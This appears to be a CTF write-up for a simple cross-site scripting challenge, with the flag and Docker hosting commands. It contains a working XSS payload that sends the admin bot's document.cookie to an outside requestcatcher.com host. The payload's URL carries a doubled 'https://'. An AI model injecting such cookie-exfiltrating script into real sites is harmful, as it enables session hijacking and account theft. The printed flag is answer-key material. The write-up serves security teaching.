# Social Media Writeup
This is a very simple Cross-Site Scripting (XSS) challenge. The flag is the cookie of the admin bot that you want to exfiltrate. XSS relies on you forcing someone else to run JavaScript code in their browser. In this challenge, you can put any HTML or JavaScript into comments or posts on your social media site, generate a link for the post, and send it to the bot, who will run it. If you insert a payload such as `<script>var myImage = new Image(100, 200); myImage.src = &quot;https://https://asdfasdfasdfsdf.requestcatcher.com/flag?cookie=&quot;+document.cookie;</script>` while having https://asdfasdfasdfsdf.requestcatcher.com/ open in another tab, the bot will send the cookie in the URL to that domain, and the flag will be in the URL. 

**Flag** - `byuctf{xss_1s_a_v3ry_common_m3thod_of_attack!}`

## Hosting
The main website can be spun up by running `python3 unhackable.py` from the local directory. The admin bot uses a Docker container that makes a webserver that can be accessed port 40006. All the proper files are included in here. The command to build the docker container is (when located inside of the `admin-bot` directory):

```bash
sudo docker build -t adminbot1 .
```

The command to start the challenge is:

```bash
sudo docker run -p 40006:1337 --detach --name adminbot1 adminbot1:latest
```

The command to stop the challenge (since `CTRL+C` won't work) is:

```bash
sudo docker stop adminbot1
```